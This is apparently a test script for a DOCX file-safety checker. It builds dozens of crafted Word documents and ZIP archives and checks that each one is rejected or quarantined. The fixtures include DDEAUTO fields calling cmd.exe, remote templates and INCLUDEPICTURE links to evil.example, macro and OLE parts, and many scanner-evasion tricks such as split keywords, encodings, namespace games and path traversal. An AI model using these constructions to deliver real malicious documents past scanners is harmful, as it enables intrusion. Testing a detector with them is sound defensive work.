"""Round-2 cases: the 18 of round 1 + every finding of codex sol review (REVIEW.md)."""
import io, json, os, resource, subprocess, sys, time, zipfile
import docx
from docx.shared import Inches
FX, CHECK = sys.argv[1], sys.argv[2]
os.makedirs(FX, exist_ok=True)
W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
def _png():
    import struct, zlib
    def chunk(t, d): return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xffffffff)
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(b"\x00\xff\x00\x00")) + chunk(b"IEND", b""))
PNG = _png()

def base_bytes(hyperlink=False, picture=False):
    d = docx.Document(); d.add_paragraph("Обсуждение машины для локального инференса.")
    t = d.add_table(rows=2, cols=2); t.cell(0, 0).text = "ОЗУ"; t.cell(0, 1).text = "128 ГБ"
    if picture:
        d.add_picture(io.BytesIO(PNG), width=Inches(0.5))
    if hyperlink:
        p = d.add_paragraph(); rid = p.part.relate_to("https://example.org/", docx.opc.constants.RELATIONSHIP_TYPE.HYPERLINK, is_external=True)
        h = docx.oxml.shared.OxmlElement("w:hyperlink"); h.set(docx.oxml.shared.qn("r:id"), rid)
        r = docx.oxml.shared.OxmlElement("w:r"); tx = docx.oxml.shared.OxmlElement("w:t"); tx.text = "ссылка"; r.append(tx); h.append(r); p._p.append(h)
    b = io.BytesIO(); d.save(b); return b.getvalue()

def rebuild(src, edit=None, add=None, rename=None, prepend=None, drop=(), stored=False):
    zin = zipfile.ZipFile(io.BytesIO(src)); out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED if stored else zipfile.ZIP_DEFLATED) as zo:
        for n, data in (prepend or {}).items(): zo.writestr(n, data)
        for i in zin.infolist():
            if i.filename in drop: continue
            data = zin.read(i.filename)
            if edit and i.filename in edit: data = edit[i.filename](data)
            zo.writestr((rename or {}).get(i.filename, i.filename), data, compress_type=zipfile.ZIP_STORED if stored else zipfile.ZIP_DEFLATED)
        for n, data in (add or {}).items(): zo.writestr(n, data)
    return out.getvalue()

def body(fragment, extra_ns=""):
    def f(data):
        s = data.decode("utf-8")
        if extra_ns: s = s.replace("<w:document ", "<w:document " + extra_ns + " ", 1)
        return s.replace("<w:sectPr", fragment + "<w:sectPr", 1).encode("utf-8")
    return {"word/document.xml": f}

def fld(*codes, pre=""):
    r = '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
    r += "".join(f'<w:r><w:instrText xml:space="preserve">{c}</w:instrText></w:r>' for c in codes)
    r += '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>x</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>'
    return f"<w:p>{pre}{r}</w:p>"

def add_rel(part_rels, rel_xml):
    return {part_rels: lambda d: d.replace(b"</Relationships>", rel_xml.encode() + b"</Relationships>")}

RT = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
RELS_NS = 'xmlns="http://schemas.openxmlformats.org/package/2006/relationships"'
def settings_rels(rel):
    return {"word/_rels/settings.xml.rels": f'<?xml version="1.0" encoding="UTF-8"?><Relationships {RELS_NS}>{rel}</Relationships>'.encode()}

B = base_bytes()
cases = []
def case(name, want, data): cases.append((name, want, data))

# ---- round 1 (18) ----
case("01_clean", "quarantine", B)
case("02_clean_hyperlink", "quarantine", base_bytes(hyperlink=True))
case("03_hyperlink_field", "quarantine", rebuild(B, body(fld(' HYPERLINK "https://example.org" '))))
case("04_ext_template", "reject", rebuild(B, add_rel("word/_rels/document.xml.rels", f'<Relationship Id="rIdT" Type="{RT}attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/>')))
case("05_vbaproject_typed", "reject", rebuild(B, {"[Content_Types].xml": lambda d: d.replace(b"</Types>", b'<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>')}, add={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0junk"}))
case("06_ct_macroenabled", "reject", rebuild(B, {"[Content_Types].xml": lambda d: d.replace(b"wordprocessingml.document.main+xml", b"ms-word.document.macroEnabled.main+xml")}))
case("07_oleobject_rel", "reject", rebuild(B, add_rel("word/_rels/document.xml.rels", f'<Relationship Id="rIdO" Type="{RT}oleObject" Target="embeddings/oleObject1.bin"/>'), add={"word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0"}))
case("08_ole_rel_elsewhere", "reject", rebuild(B, add_rel("word/_rels/document.xml.rels", f'<Relationship Id="rIdO" Type="{RT}oleObject" Target="media/x.bin"/>'), add={"word/media/x.bin": b"\xd0\xcf"}))
case("09_dde_split", "reject", rebuild(B, body(fld("DD", "EAUTO c:\\\\windows\\\\system32\\\\cmd.exe"))))
case("10_dde_charref", "reject", rebuild(B, body(fld("&#68;DE cmd"))))
case("11_prefix_swap", "reject", rebuild(B, body(fld("DDEAUTO cmd").replace("w:", "x:"), extra_ns=f'xmlns:x="{W}"')))
case("12_fldsimple_includepic", "reject", rebuild(B, body('<w:p><w:fldSimple w:instr="INCLUDEPICTURE &quot;http://evil.example/a.png&quot;"><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>')))
case("13_selfclose_glue", "reject", rebuild(B, body('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>PAGE</w:instrText></w:r><w:r><w:instrText/></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>DDEAUTO cmd</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')))
def utf16(bom):
    def f(d):
        s = d.decode("utf-8").replace("<w:sectPr", fld("DDEAUTO cmd") + "<w:sectPr", 1)
        s = s.replace("encoding='UTF-8'", 'encoding="UTF-8"')
        return s.replace('encoding="UTF-8"', 'encoding="UTF-16"').encode("utf-16") if bom else s.replace('encoding="UTF-8"', 'encoding="UTF-16LE"').encode("utf-16-le")
    return {"word/document.xml": f}
case("14_utf16_bom_dde", "reject", rebuild(B, utf16(True)))
case("15_utf16le_nobom_dde", "reject", rebuild(B, utf16(False)))
case("16_cdata_dde", "reject", rebuild(B, body('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText><![CDATA[DDEAUTO cmd]]></w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')))
case("17_comment_split_dde", "reject", rebuild(B, body(fld("DD<!-- x -->EAUTO cmd"))))
zb = io.BytesIO()
with zipfile.ZipFile(zb, "w") as z: z.writestr("a.txt", "hello")
case("18_plain_zip", "quarantine", zb.getvalue())

# ---- review round (sol, REVIEW.md) ----
case("P1-1a_type_in_target", "reject", rebuild(B, add=settings_rels(f'<Relationship Id="rIdT" Target="https://evil.example/t.dotx?Type=\'/hyperlink\'" Type="{RT}attachedTemplate" TargetMode="External"/>')))
case("P1-1b_mode_in_target", "reject", rebuild(B, add=settings_rels(f'<Relationship Id="rIdT" Target="https://evil.example/t.dotx?TargetMode=\'Internal\'" Type="{RT}attachedTemplate" TargetMode="External"/>')))
case("P1-1c_xmlns_type", "reject", rebuild(B, add=settings_rels(f'<Relationship xmlns:Type="{RT}hyperlink" Id="rIdT" Type="{RT}attachedTemplate" Target="https://evil.example/t.dotx" TargetMode="External"/>')))
case("P1-1d_xmlns_instr", "reject", rebuild(B, body('<w:p><w:fldSimple xmlns:instr="urn:example" w:instr="INCLUDETEXT &quot;x&quot;"><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>')))
case("P1-1e_quoted_gt", "reject", rebuild(B, body('<w:p><w:fldSimple xmlns:a="urn:example" a:note="&gt;>" w:instr="INCLUDETEXT &quot;x&quot;"><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>')))
HDR = f'<?xml version="1.0" encoding="UTF-8"?><w:hdr xmlns:w="{W}">{fld(" INCLUDETEXT &quot;x&quot; ")}</w:hdr>'.encode()
HDR_CT = "application/vnd.openxmlformats-officedocument.wordprocessingml.header+xml"
case("P1-2a_header_outside_word", "reject", rebuild(B, {"[Content_Types].xml": lambda d: d.replace(b"</Types>", f'<Override PartName="/parts/header.xml" ContentType="{HDR_CT}"/></Types>'.encode())}, add={"parts/header.xml": HDR}))
case("P1-2b_header_dat", "reject", rebuild(B, {"[Content_Types].xml": lambda d: d.replace(b"</Types>", f'<Override PartName="/word/header.dat" ContentType="{HDR_CT}"/></Types>'.encode())}, add={"word/header.dat": HDR}))
case("P1-3_macro_charref", "reject", rebuild(B, {"[Content_Types].xml": lambda d: d.replace(b"wordprocessingml.document.main+xml", b"ms-word.document.macro&#69;nabled.main+xml")}))
case("P1-4_encoded_begin", "reject", rebuild(B, body(fld("INCLUDE", 'TEXT "x"').replace('w:fldCharType="begin"', 'w:fldCharType="&#98;egin"'))))
case("P1-5_middot_prefix", "reject", rebuild(B, body(fld(" INCLUDETEXT &quot;x&quot; ").replace("w:", "w\u00b7:"), extra_ns=f'xmlns:w\u00b7="{W}"')))
MC = "http://schemas.openxmlformats.org/markup-compatibility/2006"
alt = ('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>IN</w:instrText></w:r>'
       f'<mc:AlternateContent xmlns:mc="{MC}"><mc:Choice Requires="w"><w:r><w:instrText>CLUDETEXT</w:instrText></w:r></mc:Choice>'
       '<mc:Fallback><w:r><w:instrText>CLUDETEXT</w:instrText></w:r></mc:Fallback></mc:AlternateContent>'
       '<w:r><w:instrText> "x"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
case("P1-6_alternatecontent", "reject", rebuild(B, body(alt)))
bad = rebuild(B, body(fld(' INCLUDETEXT "x" ')))
case("P1-7_reordered_as_zip", "reject", rebuild(bad, {"[Content_Types].xml": lambda d: d.replace(b"</Types>", b'<Default Extension="txt" ContentType="text/plain"/></Types>')}, prepend={f"notes/n{i:02d}.txt": b"note" for i in range(20)}))
zz = io.BytesIO()
with zipfile.ZipFile(zz, "w") as z: z.writestr("report.docx", bad)
case("P1-7b_docx_inside_zip", "reject", zz.getvalue())
case("P1-8_long_attr_16k", "quarantine", rebuild(B, body(fld(" PAGE ").replace('<w:fldChar w:fldCharType="begin"/>', '<w:fldChar a="' + "a" * 16000 + '" w:fldCharType="begin"/>'))))
case("P1-8_long_attr_4m", "quarantine", rebuild(B, body(fld(" PAGE ").replace('<w:fldChar w:fldCharType="begin"/>', '<w:fldChar a="' + __import__("base64").b64encode(__import__("random").Random(7).randbytes(3000000)).decode().replace("+", "x").replace("/", "y") + '" w:fldCharType="begin"/>'))))
case("P2-1a_hyperlink_dde_in_url", "quarantine", rebuild(B, body(fld(' HYPERLINK "https://example.org/DDE/manual" '))))
case("P2-1b_if_dde_literal", "quarantine", rebuild(B, body(fld(' IF "DDE" = "DDE" "yes" "no" '))))
case("P2-2a_commented_field", "quarantine", rebuild(B, body('<!-- <w:fldSimple w:instr="INCLUDETEXT sample"/> -->')))
case("P2-2b_cdata_visible", "quarantine", rebuild(B, body('<w:p><w:r><w:t><![CDATA[<w:fldSimple w:instr="INCLUDETEXT sample"/>]]></w:t></w:r></w:p>')))
case("P2-2c_commented_ext_rel", "quarantine", rebuild(B, {"word/_rels/document.xml.rels": lambda d: d.replace(b"</Relationships>", f'<!-- <Relationship Id="rIdT" Type="{RT}attachedTemplate" Target="http://x" TargetMode="External"/> --></Relationships>'.encode())}))
def ren_main(d): return d.replace(b"/word/document.xml", b"/word/main.xml")
case("P2-3_main_renamed", "quarantine", rebuild(B, {"[Content_Types].xml": ren_main, "_rels/.rels": lambda d: d.replace(b"word/document.xml", b"word/main.xml")}, rename={"word/document.xml": "word/main.xml", "word/_rels/document.xml.rels": "word/_rels/main.xml.rels"}))
P = base_bytes(picture=True)
case("P2-4a_png_in_embeddings", "quarantine", rebuild(P, {"word/_rels/document.xml.rels": lambda d: d.replace(b"media/image1.png", b"embeddings/photo.png")}, rename={"word/media/image1.png": "word/embeddings/photo.png"}))
case("P2-4b_png_named_vbaproject", "quarantine", rebuild(P, {"word/_rels/document.xml.rels": lambda d: d.replace(b"media/image1.png", b"media/vbaProject.bin"), "[Content_Types].xml": lambda d: d.replace(b"</Types>", b'<Override PartName="/word/media/vbaProject.bin" ContentType="image/png"/></Types>')}, rename={"word/media/image1.png": "word/media/vbaProject.bin"}))
case("P2-5_utf16le_nobom_clean", "quarantine", rebuild(B, {"word/document.xml": lambda d: d.decode().replace("encoding='UTF-8'", 'encoding="UTF-16LE"').encode("utf-16-le")}))
case("P2-6_60k_fields", "quarantine", rebuild(B, body("".join('<w:p><w:fldSimple w:instr="PAGE"/></w:p>' for _ in range(60000)))))
case("X1_doctype", "reject", rebuild(B, {"word/document.xml": lambda d: d.replace(b"?>", b'?><!DOCTYPE x [<!ENTITY a "aaaa">]>', 1)}))
case("X2_picture_clean", "quarantine", P)


# ---- review round 2 (REVIEW2.md) ----
MCD = f'xmlns:mc="{MC}" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml"'
n1a = ('<w:p><mc:AlternateContent><mc:Choice Requires="w14"><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>IN</w:instrText></w:r></mc:Choice>'
       '<mc:Fallback><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">QUOTE </w:instrText></w:r></mc:Fallback></mc:AlternateContent>'
       '<w:r><w:instrText>CLUDETEXT "x"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
case("R2-N1a_field_begins_in_alt", "reject", rebuild(B, body(n1a)))
n1b = ('<w:p xmlns:x="urn:review2" mc:Ignorable="x"><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>IN</w:instrText></w:r>'
       '<x:opaque><w:r><w:instrText>X</w:instrText></w:r></x:opaque>'
       '<w:r><w:instrText>CLUDETEXT "x"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
case("R2-N1b_ignorable_subtree", "reject", rebuild(B, body(n1b)))
for kw in ("DDE", "DDEAUTO", "INCLUDETEXT", "INCLUDEPICTURE", "LINK", "IMPORT"):
    n2 = ('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:del w:id="1" w:author="A"><w:r><w:delInstrText>PAGE</w:delInstrText></w:r></w:del>'
          f'<w:ins w:id="2" w:author="A"><w:r><w:instrText>{kw} "x"</w:instrText></w:r></w:ins><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
    case(f"R2-N2_tracked_{kw}", "reject", rebuild(B, body(n2)))
case("R2-P2N1a_70_nested_begins", "reject", rebuild(B, body("<w:p>" + '<w:r><w:fldChar w:fldCharType="begin"/></w:r>' * 70 + '<w:r><w:fldChar w:fldCharType="end"/></w:r>' * 70 + "</w:p>")))
case("R2-P2N1b_fldsimple_200k", "reject", rebuild(B, body('<w:p><w:fldSimple w:instr="QUOTE ' + __import__("base64").b64encode(__import__("random").Random(3).randbytes(150000)).decode() + '"/></w:p>')))
case("R2-P2N1c_depth_300", "reject", rebuild(B, body("<w:p>" + "<w:sdt><w:sdtContent>" * 150 + "</w:sdtContent></w:sdt>" * 150 + "</w:p>")))
CUST = f'<?xml version="1.0" encoding="UTF-8"?><dataset xmlns:w="{W}"><example><w:fldSimple w:instr="INCLUDETEXT &quot;x&quot;"/></example></dataset>'.encode()
case("R2-P2N2_customxml_example", "quarantine", rebuild(B, add_rel("word/_rels/document.xml.rels", f'<Relationship Id="rIdC" Type="{RT}customXml" Target="../customXml/review.xml"/>'), add={"customXml/review.xml": CUST}))
n3 = ('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>PAGE</w:instrText></w:r><mc:AlternateContent><mc:Choice Requires="w14"><w:r><w:instrText> \\* MERGEFORMAT</w:instrText></w:r></mc:Choice>'
      '<mc:Fallback><w:r><w:instrText> \\* MERGEFORMAT</w:instrText></w:r></mc:Fallback></mc:AlternateContent><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>1</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
case("R2-P2N3_harmless_alt_KNOWN_LIMIT", "reject", rebuild(B, body(n3)))
tb = ('<w:p><w:r><mc:AlternateContent><mc:Choice Requires="w14"><w:pict><w:p><w:fldSimple w:instr="PAGE"/></w:p></w:pict></mc:Choice>'
      '<mc:Fallback><w:pict><w:p><w:fldSimple w:instr="PAGE"/></w:p></w:pict></mc:Fallback></mc:AlternateContent></w:r></w:p>')
case("R2-textbox_page_in_alt_KNOWN_LIMIT", "reject", rebuild(B, body(tb)))
zp = io.BytesIO()
with zipfile.ZipFile(zp, "w") as z: z.writestr("show.ppsm", B)
case("R2-P2N4_ppsm_inside_zip", "reject", zp.getvalue())
case("R2-P3N1a_empty_manifest", "reject", rebuild(B, {"[Content_Types].xml": lambda d: b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'}))
case("R2-P3N1b_foreign_root", "reject", rebuild(B, {"[Content_Types].xml": lambda d: b'<?xml version="1.0"?><nothing/>'}))
def with_header():
    d = docx.Document(); d.add_paragraph("Текст.")
    hp = d.sections[0].header.paragraphs[0]
    f = docx.oxml.shared.OxmlElement("w:fldSimple"); f.set(docx.oxml.shared.qn("w:instr"), "PAGE"); hp._p.append(f)
    b = io.BytesIO(); d.save(b); return b.getvalue()
case("R2-header_page_field_clean", "quarantine", with_header())


# ---- review round 3 (REVIEW3.md) ----
for kw in ("DDE", "DDEAUTO", "INCLUDETEXT", "INCLUDEPICTURE", "LINK", "IMPORT"):
    a, b = kw[:2], kw[2:]
    v = (f'<w:p xmlns:x="http://schemas.microsoft.com/office/review3" mc:Ignorable="x"><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>{a}</w:instrText></w:r>'
         f'<x:opaque><w:r><w:instrText>X</w:instrText></w:r></x:opaque><w:r><w:instrText>{b} "x"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
    case(f"R3-vendor_prefix_ns_{kw}", "reject", rebuild(B, body(v)))
mo = ('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">QUOTE </w:instrText></w:r>'
      + '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>' * 70000 + '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
case("R3-marker_overflow_70k", "reject", rebuild(B, body(mo), stored=True))
CTX = lambda d: d.replace(b"</Types>", b'<Default Extension="zzz" ContentType="x/y"><Inner/></Default></Types>')
case("R3-manifest_nested_child", "reject", rebuild(B, {"[Content_Types].xml": CTX}))
DUP = lambda d: d.replace(b"</Types>", b'<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/word/vbaProject.bin" ContentType="application/octet-stream"/></Types>')
case("R3-duplicate_override", "reject", rebuild(B, {"[Content_Types].xml": DUP}, add={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0"}))
MANY = lambda d: d.replace(b"</Types>", "".join(f'<Default Extension="e{i}" ContentType="x/y"/>' for i in range(11000)).encode() + b"</Types>")
case("R3-11000_defaults", "reject", rebuild(B, {"[Content_Types].xml": MANY}))
for ext in ("odc", "otc", "odi", "otf"):
    zo_ = io.BytesIO()
    with zipfile.ZipFile(zo_, "w") as z: z.writestr(f"x.{ext}", B)
    case(f"R3-{ext}_inside_zip", "reject", zo_.getvalue())
H = with_header()
case("R3-header_typed_appxml", "reject", rebuild(H, {"[Content_Types].xml": lambda d: d.replace(b"wordprocessingml.header+xml", b"WILL_BE_GENERIC").replace(b"application/vnd.openxmlformats-officedocument.WILL_BE_GENERIC", b"application/xml")}))
def absent_main(d):
    d = d.replace(b'<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>', b"")
    return d.replace(b"</Types>", b'<Override PartName="/absent.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
case("R3-main_absent_override", "reject", rebuild(rebuild(B, body(fld(' INCLUDETEXT "x" '))), {"[Content_Types].xml": absent_main}))


# ---- review round 4 (REVIEW4.md) ----
HA = rebuild(H, {"word/header1.xml": lambda d: d.replace(b'w:instr="PAGE"', b'w:instr="INCLUDETEXT &quot;x&quot;"')})
for tag, enc in (("pct20", "header%20x.xml"), ("pctC3A9", "header%C3%A9.xml"), ("pct2520", "header%2520x.xml")):
    case(f"R4-percent_header_{tag}", "reject", rebuild(HA, {"[Content_Types].xml": (lambda e: lambda d: d.replace(b"/word/header1.xml", ("/word/" + e).encode()))(enc),
                                                           "word/_rels/document.xml.rels": (lambda e: lambda d: d.replace(b'Target="header1.xml"', ('Target="' + e + '"').encode()))(enc)},
                                                       rename={"word/header1.xml": "word/" + enc}))
case("R4-percent_main_clean", "quarantine", rebuild(B, {"[Content_Types].xml": lambda d: d.replace(b"/word/document.xml", b"/word/document%20x.xml"),
                                                       "_rels/.rels": lambda d: d.replace(b"word/document.xml", b"word/document%20x.xml")},
                                                   rename={"word/document.xml": "word/document%20x.xml", "word/_rels/document.xml.rels": "word/_rels/document%20x.xml.rels"}))
HS = lambda t: {"[Content_Types].xml": lambda d: d.replace(b"application/vnd.openxmlformats-officedocument.wordprocessingml.header+xml", t)}
case("R4-header_story_type_docx_route", "reject", rebuild(HA, HS(b"application/vnd.example.story+xml")))
case("R4-header_png_type_zip_route", "reject", rebuild(rebuild(HA, HS(b"image/png")), {"[Content_Types].xml": lambda d: d.replace(b"</Types>", b'<Default Extension="txt" ContentType="text/plain"/></Types>')}, prepend={f"notes/n{i:02d}.txt": b"note" for i in range(20)}))


# ---- review round 5 (REVIEW5.md) ----
for tag, enc in (("pct5C_dotdot", "a%5C..%5Cheader.xml"), ("literal_dotdot", "a/../header.xml")):
    case(f"R5-{tag}_header", "reject", rebuild(HA, {"[Content_Types].xml": (lambda e: lambda d: d.replace(b"/word/header1.xml", ("/word/" + e).encode()))(enc),
                                                   "word/_rels/document.xml.rels": (lambda e: lambda d: d.replace(b'Target="header1.xml"', ('Target="' + e + '"').encode()))(enc)},
                                               rename={"word/header1.xml": "word/" + enc}))

ok_all, rows = True, []
env = dict(os.environ, FILE_SAFETY_JOURNAL=os.path.join(FX, "journal.test.log"))
ONLY = os.environ.get("ONLY")
for name, want, data in cases:
    if ONLY and not any(k in name for k in ONLY.split(",")): continue
    p = os.path.join(FX, name + (".zip" if "zip" in name.split("_", 1)[-1] and "as_zip" not in name else ".docx"))
    open(p, "wb").write(data)
    t0 = time.time()
    r = subprocess.run([sys.executable, "-I", CHECK, p], capture_output=True, text=True, env=env)
    dt = time.time() - t0
    rss = resource.getrusage(resource.RUSAGE_CHILDREN).ru_maxrss // 1024
    try: lab = json.loads(r.stdout)
    except Exception: print("НЕТ JSON", name, r.stderr[-300:]); ok_all = False; continue
    good = lab["verdict"] == want; ok_all &= good
    print(("OK  " if good else "FAIL"), name, "| ждал", want, "| вышло", lab["verdict"], "|", lab["mime"].rsplit("/", 1)[-1][-22:], "|", lab["static_reasons"], f"| {dt:.2f}s maxrss≤{rss}MB")
print("ИТОГ:", "все сошлись" if ok_all else "ЕСТЬ РАСХОЖДЕНИЯ", f"({len(cases)} случаев)")
